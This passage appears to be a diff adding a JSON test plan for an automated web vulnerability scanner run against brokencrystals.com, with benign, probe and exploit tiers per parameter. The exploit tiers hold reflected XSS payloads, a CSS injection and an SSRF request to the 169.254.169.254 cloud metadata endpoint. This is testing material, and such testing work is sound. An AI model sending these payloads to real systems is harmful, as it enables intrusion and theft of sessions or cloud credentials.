@@ -1,0 +1,1362 @@
+{
+  "test_cases": [
+    {
+      "id": "TC-H1-1",
+      "hypothesis_id": "H1",
+      "base_url": "https",
+      "method": "GET",
+      "endpoint": "/vendor/counter-up/jquery.waypoints.min.js",
+      "parameter": "horizontal",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "horizontal="
+            }
+          ],
+          "description": "Baseline request without value to measure reflection/length",
+          "header": [
+            {
+              "header_name": "referer",
+              "header_value": "https://brokencrystals.com/"
+            },
+            {
+              "header_name": "user-agent",
+              "header_value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+            },
+            {
+              "header_name": "sec-ch-ua",
+              "header_value": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\""
+            },
+            {
+              "header_name": "sec-ch-ua-mobile",
+              "header_value": "?0"
+            },
+            {
+              "header_name": "sec-ch-ua-platform",
+              "header_value": "\"Windows\""
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "horizontal=test123"
+            }
+          ],
+          "description": "Alphanumeric probe for safe reflection detection",
+          "header": [
+            {
+              "header_name": "referer",
+              "header_value": "https://brokencrystals.com/"
+            },
+            {
+              "header_name": "user-agent",
+              "header_value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+            },
+            {
+              "header_name": "sec-ch-ua",
+              "header_value": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\""
+            },
+            {
+              "header_name": "sec-ch-ua-mobile",
+              "header_value": "?0"
+            },
+            {
+              "header_name": "sec-ch-ua-platform",
+              "header_value": "\"Windows\""
+            }
+          ]
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "horizontal=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+            }
+          ],
+          "description": "URL-encoded reflected XSS attempt within JS context",
+          "encoding": "url",
+          "header": [
+            {
+              "header_name": "referer",
+              "header_value": "https://brokencrystals.com/"
+            },
+            {
+              "header_name": "user-agent",
+              "header_value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+            },
+            {
+              "header_name": "sec-ch-ua",
+              "header_value": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\""
+            },
+            {
+              "header_name": "sec-ch-ua-mobile",
+              "header_value": "?0"
+            },
+            {
+              "header_name": "sec-ch-ua-platform",
+              "header_value": "\"Windows\""
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "session_state",
+          "description": "Use observed session cookie for authenticated asset access",
+          "extract_from": "tokens_observed.connect.sid",
+          "bind_to": "Cookie",
+          "custom_logic": "Set Cookie header to connect.sid=<observed_value> if present"
+        },
+        {
+          "type": "custom",
+          "description": "Ensure HTTPS scheme as observed",
+          "custom_logic": "Use https and preserve headers from context"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "reflected_input",
+          "condition": "Search response body for literal test123 or decoded <script>alert(1)</script> from parameter value",
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "Compare body length between baseline and probe/exploit",
+          "threshold": {
+            "body_length_delta_pct": 20.0
+          },
+          "weight": 0.5
+        },
+        {
+          "signal": "status_code_change",
+          "condition": "Monitor status codes against expected",
+          "threshold": {
+            "expected_codes": [
+              200,
+              304
+            ]
+          },
+          "weight": 0.3
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 6
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.2,
+      "tags": [
+        "xss",
+        "reflected",
+        "js-asset"
+      ],
+      "estimated_duration": 2
+    },
+    {
+      "id": "TC-H2-1",
+      "hypothesis_id": "H2",
+      "base_url": "https",
+      "method": "GET",
+      "endpoint": "/maps/embed",
+      "parameter": "pb",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "pb="
+            }
+          ],
+          "description": "Baseline empty pb",
+          "header": [
+            {
+              "header_name": "referer",
+              "header_value": "https://brokencrystals.com/"
+            },
+            {
+              "header_name": "upgrade-insecure-requests",
+              "header_value": "1"
+            },
+            {
+              "header_name": "user-agent",
+              "header_value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+            },
+            {
+              "header_name": "sec-ch-ua",
+              "header_value": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\""
+            },
+            {
+              "header_name": "sec-ch-ua-mobile",
+              "header_value": "?0"
+            },
+            {
+              "header_name": "sec-ch-ua-platform",
+              "header_value": "\"Windows\""
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "pb=http://127.0.0.1:80/"
+            }
+          ],
+          "description": "Loopback URL to test SSRF handling without OOB infra",
+          "header": [
+            {
+              "header_name": "referer",
+              "header_value": "https://brokencrystals.com/"
+            },
+            {
+              "header_name": "upgrade-insecure-requests",
+              "header_value": "1"
+            },
+            {
+              "header_name": "user-agent",
+              "header_value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+            },
+            {
+              "header_name": "sec-ch-ua",
+              "header_value": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\""
+            },
+            {
+              "header_name": "sec-ch-ua-mobile",
+              "header_value": "?0"
+            },
+            {
+              "header_name": "sec-ch-ua-platform",
+              "header_value": "\"Windows\""
+            }
+          ]
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "pb=http://169.254.169.254/latest/meta-data/"
+            }
+          ],
+          "description": "Attempt access to cloud metadata endpoint to indicate SSRF",
+          "header": [
+            {
+              "header_name": "referer",
+              "header_value": "https://brokencrystals.com/"
+            },
+            {
+              "header_name": "upgrade-insecure-requests",
+              "header_value": "1"
+            },
+            {
+              "header_name": "user-agent",
+              "header_value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+            },
+            {
+              "header_name": "sec-ch-ua",
+              "header_value": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\""
+            },
+            {
+              "header_name": "sec-ch-ua-mobile",
+              "header_value": "?0"
+            },
+            {
+              "header_name": "sec-ch-ua-platform",
+              "header_value": "\"Windows\""
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "session_state",
+          "description": "Use observed session cookie for access",
+          "extract_from": "tokens_observed.connect.sid",
+          "bind_to": "Cookie",
+          "custom_logic": "Set Cookie header if token present"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "dns_callback",
+          "condition": "Monitor external collaborator for DNS lookups triggered by server due to provided URL",
+          "weight": 1.0
+        },
+        {
+          "signal": "http_callback",
+          "condition": "Detect HTTP callbacks from target environment to controlled endpoint (if configured)",
+          "weight": 1.0
+        },
+        {
+          "signal": "status_code_change",
+          "condition": "Observe status code variance when pb points to internal resources",
+          "threshold": {
+            "expected_codes": [
+              200,
+              302,
+              400,
+              403,
+              500
+            ]
+          },
+          "weight": 0.4
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 5
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.3,
+      "notes": "No destructive endpoints requested; read-only embed",
+      "tags": [
+        "ssrf",
+        "embed"
+      ],
+      "estimated_duration": 2
+    },
+    {
+      "id": "TC-H3-1",
+      "hypothesis_id": "H3",
+      "base_url": "https",
+      "method": "GET",
+      "endpoint": "/maps/embed",
+      "parameter": "pb",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "pb="
+            }
+          ],
+          "description": "Baseline for reflection diff",
+          "header": [
+            {
+              "header_name": "referer",
+              "header_value": "https://brokencrystals.com/"
+            },
+            {
+              "header_name": "upgrade-insecure-requests",
+              "header_value": "1"
+            },
+            {
+              "header_name": "user-agent",
+              "header_value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+            },
+            {
+              "header_name": "sec-ch-ua",
+              "header_value": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\""
+            },
+            {
+              "header_name": "sec-ch-ua-mobile",
+              "header_value": "?0"
+            },
+            {
+              "header_name": "sec-ch-ua-platform",
+              "header_value": "\"Windows\""
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "pb=reflectXSS"
+            }
+          ],
+          "description": "Alphanumeric probe for safe reflection",
+          "header": [
+            {
+              "header_name": "referer",
+              "header_value": "https://brokencrystals.com/"
+            },
+            {
+              "header_name": "upgrade-insecure-requests",
+              "header_value": "1"
+            },
+            {
+              "header_name": "user-agent",
+              "header_value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+            },
+            {
+              "header_name": "sec-ch-ua",
+              "header_value": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\""
+            },
+            {
+              "header_name": "sec-ch-ua-mobile",
+              "header_value": "?0"
+            },
+            {
+              "header_name": "sec-ch-ua-platform",
+              "header_value": "\"Windows\""
+            }
+          ]
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "pb=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
+            }
+          ],
+          "description": "URL-encoded HTML injection for reflected XSS in embed",
+          "encoding": "url",
+          "header": [
+            {
+              "header_name": "referer",
+              "header_value": "https://brokencrystals.com/"
+            },
+            {
+              "header_name": "upgrade-insecure-requests",
+              "header_value": "1"
+            },
+            {
+              "header_name": "user-agent",
+              "header_value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+            },
+            {
+              "header_name": "sec-ch-ua",
+              "header_value": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\""
+            },
+            {
+              "header_name": "sec-ch-ua-mobile",
+              "header_value": "?0"
+            },
+            {
+              "header_name": "sec-ch-ua-platform",
+              "header_value": "\"Windows\""
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "session_state",
+          "description": "Use connect.sid cookie",
+          "extract_from": "tokens_observed.connect.sid",
+          "bind_to": "Cookie",
+          "custom_logic": "Apply Cookie header if available"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "reflected_input",
+          "condition": "Body contains literal reflectXSS or decoded <img src=x onerror=alert(1)>",
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "Measure size difference baseline vs probe/exploit",
+          "threshold": {
+            "body_length_delta_pct": 25.0
+          },
+          "weight": 0.5
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 6
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.2,
+      "tags": [
+        "xss",
+        "reflected",
+        "embed"
+      ],
+      "estimated_duration": 2
+    },
+    {
+      "id": "TC-H4-1",
+      "hypothesis_id": "H4",
+      "base_url": "https",
+      "method": "GET",
+      "endpoint": "/css",
+      "parameter": "family",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "family="
+            }
+          ],
+          "description": "Baseline CSS request",
+          "header": [
+            {
+              "header_name": "referer",
+              "header_value": "https://brokencrystals.com/"
+            },
+            {
+              "header_name": "user-agent",
+              "header_value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+            },
+            {
+              "header_name": "sec-ch-ua",
+              "header_value": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\""
+            },
+            {
+              "header_name": "sec-ch-ua-mobile",
+              "header_value": "?0"
+            },
+            {
+              "header_name": "sec-ch-ua-platform",
+              "header_value": "\"Windows\""
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "family=safeFont"
+            }
+          ],
+          "description": "Safe token to test reflection/length in CSS",
+          "header": [
+            {
+              "header_name": "referer",
+              "header_value": "https://brokencrystals.com/"
+            },
+            {
+              "header_name": "user-agent",
+              "header_value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+            },
+            {
+              "header_name": "sec-ch-ua",
+              "header_value": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\""
+            },
+            {
+              "header_name": "sec-ch-ua-mobile",
+              "header_value": "?0"
+            },
+            {
+              "header_name": "sec-ch-ua-platform",
+              "header_value": "\"Windows\""
+            }
+          ]
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "family=%22%7Dbody%7Bbackground: url(%22javascript:alert(1)%22)%7D/*"
+            }
+          ],
+          "description": "Attempt CSS injection via crafted family value",
+          "encoding": "url",
+          "header": [
+            {
+              "header_name": "referer",
+              "header_value": "https://brokencrystals.com/"
+            },
+            {
+              "header_name": "user-agent",
+              "header_value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+            },
+            {
+              "header_name": "sec-ch-ua",
+              "header_value": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\""
+            },
+            {
+              "header_name": "sec-ch-ua-mobile",
+              "header_value": "?0"
+            },
+            {
+              "header_name": "sec-ch-ua-platform",
+              "header_value": "\"Windows\""
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "session_state",
+          "description": "Maintain cookie session",
+          "extract_from": "tokens_observed.connect.sid",
+          "bind_to": "Cookie",
+          "custom_logic": "Attach Cookie header if available"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "reflected_input",
+          "condition": "Look for safeFont or decoded CSS payload reflected in response",
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "Compare lengths between baseline and probe/exploit",
+          "threshold": {
+            "body_length_delta_pct": 20.0
+          },
+          "weight": 0.4
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 6
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.2,
+      "tags": [
+        "xss",
+        "css-injection"
+      ],
+      "estimated_duration": 2
+    },
+    {
+      "id": "TC-H5-1",
+      "hypothesis_id": "H5",
+      "base_url": "https",
+      "method": "GET",
+      "endpoint": "/assets/vendor/jquery/jquery.min.js",
+      "parameter": "object",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "object="
+            }
+          ],
+          "description": "Baseline JS asset fetch",
+          "header": [
+            {
+              "header_name": "referer",
+              "header_value": "https://brokencrystals.com/"
+            },
+            {
+              "header_name": "user-agent",
+              "header_value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+            },
+            {
+              "header_name": "sec-ch-ua",
+              "header_value": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\""
+            },
+            {
+              "header_name": "sec-ch-ua-mobile",
+              "header_value": "?0"
+            },
+            {
+              "header_name": "sec-ch-ua-platform",
+              "header_value": "\"Windows\""
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "object=probeVal"
+            }
+          ],
+          "description": "Safe token reflection check in JS",
+          "header": [
+            {
+              "header_name": "referer",
+              "header_value": "https://brokencrystals.com/"
+            },
+            {
+              "header_name": "user-agent",
+              "header_value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+            },
+            {
+              "header_name": "sec-ch-ua",
+              "header_value": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\""
+            },
+            {
+              "header_name": "sec-ch-ua-mobile",
+              "header_value": "?0"
+            },
+            {
+              "header_name": "sec-ch-ua-platform",
+              "header_value": "\"Windows\""
+            }
+          ]
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "object=%3Balert(1)%2F%2F"
+            }
+          ],
+          "description": "Attempt to break JS context via encoded payload",
+          "encoding": "url",
+          "header": [
+            {
+              "header_name": "referer",
+              "header_value": "https://brokencrystals.com/"
+            },
+            {
+              "header_name": "user-agent",
+              "header_value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+            },
+            {
+              "header_name": "sec-ch-ua",
+              "header_value": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\""
+            },
+            {
+              "header_name": "sec-ch-ua-mobile",
+              "header_value": "?0"
+            },
+            {
+              "header_name": "sec-ch-ua-platform",
+              "header_value": "\"Windows\""
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "session_state",
+          "description": "Apply connect.sid cookie if present",
+          "extract_from": "tokens_observed.connect.sid",
+          "bind_to": "Cookie",
+          "custom_logic": "Set Cookie header accordingly"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "reflected_input",
+          "condition": "Body contains probeVal or decoded ;alert(1)//",
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "Check length delta vs baseline",
+          "threshold": {
+            "body_length_delta_pct": 20.0
+          },
+          "weight": 0.5
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 6
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.2,
+      "tags": [
+        "xss",
+        "js-asset"
+      ],
+      "estimated_duration": 2
+    },
+    {
+      "id": "TC-H6-1",
+      "hypothesis_id": "H6",
+      "base_url": "https",
+      "method": "GET",
+      "endpoint": "/",
+      "parameter": "config",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "config="
+            }
+          ],
+          "description": "Baseline root fetch",
+          "header": [
+            {
+              "header_name": "upgrade-insecure-requests",
+              "header_value": "1"
+            },
+            {
+              "header_name": "user-agent",
+              "header_value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+            },
+            {
+              "header_name": "sec-ch-ua",
+              "header_value": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\""
+            },
+            {
+              "header_name": "sec-ch-ua-mobile",
+              "header_value": "?0"
+            },
+            {
+              "header_name": "sec-ch-ua-platform",
+              "header_value": "\"Windows\""
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "config=baselineToken"
+            }
+          ],
+          "description": "Safe reflection token in HTML/script context",
+          "header": [
+            {
+              "header_name": "upgrade-insecure-requests",
+              "header_value": "1"
+            },
+            {
+              "header_name": "user-agent",
+              "header_value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+            },
+            {
+              "header_name": "sec-ch-ua",
+              "header_value": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\""
+            },
+            {
+              "header_name": "sec-ch-ua-mobile",
+              "header_value": "?0"
+            },
+            {
+              "header_name": "sec-ch-ua-platform",
+              "header_value": "\"Windows\""
+            }
+          ]
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "config=%3Csvg%2Fonload%3Dalert(1)%3E"
+            }
+          ],
+          "description": "Attempt reflected XSS in HTML context",
+          "encoding": "url",
+          "header": [
+            {
+              "header_name": "upgrade-insecure-requests",
+              "header_value": "1"
+            },
+            {
+              "header_name": "user-agent",
+              "header_value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+            },
+            {
+              "header_name": "sec-ch-ua",
+              "header_value": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\""
+            },
+            {
+              "header_name": "sec-ch-ua-mobile",
+              "header_value": "?0"
+            },
+            {
+              "header_name": "sec-ch-ua-platform",
+              "header_value": "\"Windows\""
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "session_state",
+          "description": "Use cookie session if available",
+          "extract_from": "tokens_observed.connect.sid",
+          "bind_to": "Cookie",
+          "custom_logic": "Attach Cookie header if token observed"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "reflected_input",
+          "condition": "Body contains baselineToken or decoded <svg/onload=alert(1)>",
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "Compute length delta baseline vs others",
+          "threshold": {
+            "body_length_delta_pct": 15.0
+          },
+          "weight": 0.4
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 6
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.2,
+      "tags": [
+        "xss",
+        "root"
+      ],
+      "estimated_duration": 2
+    },
+    {
+      "id": "TC-H7-1",
+      "hypothesis_id": "H7",
+      "base_url": "https",
+      "method": "GET",
+      "endpoint": "/",
+      "parameter": "description",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "description="
+            }
+          ],
+          "description": "Baseline request at root",
+          "header": [
+            {
+              "header_name": "upgrade-insecure-requests",
+              "header_value": "1"
+            },
+            {
+              "header_name": "user-agent",
+              "header_value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+            },
+            {
+              "header_name": "sec-ch-ua",
+              "header_value": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\""
+            },
+            {
+              "header_name": "sec-ch-ua-mobile",
+              "header_value": "?0"
+            },
+            {
+              "header_name": "sec-ch-ua-platform",
+              "header_value": "\"Windows\""
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "description=descProbe"
+            }
+          ],
+          "description": "Safe token to detect reflection in meta/HTML",
+          "header": [
+            {
+              "header_name": "upgrade-insecure-requests",
+              "header_value": "1"
+            },
+            {
+              "header_name": "user-agent",
+              "header_value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+            },
+            {
+              "header_name": "sec-ch-ua",
+              "header_value": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\""
+            },
+            {
+              "header_name": "sec-ch-ua-mobile",
+              "header_value": "?0"
+            },
+            {
+              "header_name": "sec-ch-ua-platform",
+              "header_value": "\"Windows\""
+            }
+          ]
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "description=%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+            }
+          ],
+          "description": "Break attribute context to inject script",
+          "encoding": "url",
+          "header": [
+            {
+              "header_name": "upgrade-insecure-requests",
+              "header_value": "1"
+            },
+            {
+              "header_name": "user-agent",
+              "header_value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+            },
+            {
+              "header_name": "sec-ch-ua",
+              "header_value": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\""
+            },
+            {
+              "header_name": "sec-ch-ua-mobile",
+              "header_value": "?0"
+            },
+            {
+              "header_name": "sec-ch-ua-platform",
+              "header_value": "\"Windows\""
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "session_state",
+          "description": "Include connect.sid if available",
+          "extract_from": "tokens_observed.connect.sid",
+          "bind_to": "Cookie",
+          "custom_logic": "Attach Cookie header"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "reflected_input",
+          "condition": "Body contains descProbe or decoded \"><script>alert(1)</script>",
+          "weight": 1.0
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "Length delta baseline vs probe/exploit",
+          "threshold": {
+            "body_length_delta_pct": 15.0
+          },
+          "weight": 0.4
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 6
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.2,
+      "tags": [
+        "xss",
+        "meta"
+      ],
+      "estimated_duration": 2
+    },
+    {
+      "id": "TC-H8-1",
+      "hypothesis_id": "H8",
+      "base_url": "https",
+      "method": "GET",
+      "endpoint": "/",
+      "parameter": "theme-color",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "theme-color="
+            }
+          ],
+          "description": "Baseline for DOM-bound param",
+          "header": [
+            {
+              "header_name": "upgrade-insecure-requests",
+              "header_value": "1"
+            },
+            {
+              "header_name": "user-agent",
+              "header_value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+            },
+            {
+              "header_name": "sec-ch-ua",
+              "header_value": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\""
+            },
+            {
+              "header_name": "sec-ch-ua-mobile",
+              "header_value": "?0"
+            },
+            {
+              "header_name": "sec-ch-ua-platform",
+              "header_value": "\"Windows\""
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "theme-color=%23a1b2c3"
+            }
+          ],
+          "description": "Safe hex color to observe DOM-linked reflection via server response diff",
+          "encoding": "url",
+          "header": [
+            {
+              "header_name": "upgrade-insecure-requests",
+              "header_value": "1"
+            },
+            {
+              "header_name": "user-agent",
+              "header_value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+            },
+            {
+              "header_name": "sec-ch-ua",
+              "header_value": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\""
+            },
+            {
+              "header_name": "sec-ch-ua-mobile",
+              "header_value": "?0"
+            },
+            {
+              "header_name": "sec-ch-ua-platform",
+              "header_value": "\"Windows\""
+            }
+          ]
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "query",
+              "value": "theme-color=%22%3E%3Csvg%2Fonload%3Dalert(1)%3E"
+            }
+          ],
+          "description": "Attempt DOM/HTML attribute break to script",
+          "encoding": "url",
+          "header": [
+            {
+              "header_name": "upgrade-insecure-requests",
+              "header_value": "1"
+            },
+            {
+              "header_name": "user-agent",
+              "header_value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+            },
+            {
+              "header_name": "sec-ch-ua",
+              "header_value": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\""
+            },
+            {
+              "header_name": "sec-ch-ua-mobile",
+              "header_value": "?0"
+            },
+            {
+              "header_name": "sec-ch-ua-platform",
+              "header_value": "\"Windows\""
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "session_state",
+          "description": "Preserve session cookie",
+          "extract_from": "tokens_observed.connect.sid",
+          "bind_to": "Cookie",
+          "custom_logic": "Attach Cookie header if present"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "reflected_input",
+          "condition": "Server body contains %23a1b2c3 or decoded \"><svg/onload=alert(1)>",
+          "weight": 1.0
+        },
+        {
+          "signal": "header_change",
+          "condition": "Check for any response header differences when toggling parameter",
+          "threshold": {},
+          "weight": 0.2
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "Small length variance indicating parameter inclusion",
+          "threshold": {
+            "body_length_delta_pct": 10.0
+          },
+          "weight": 0.3
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
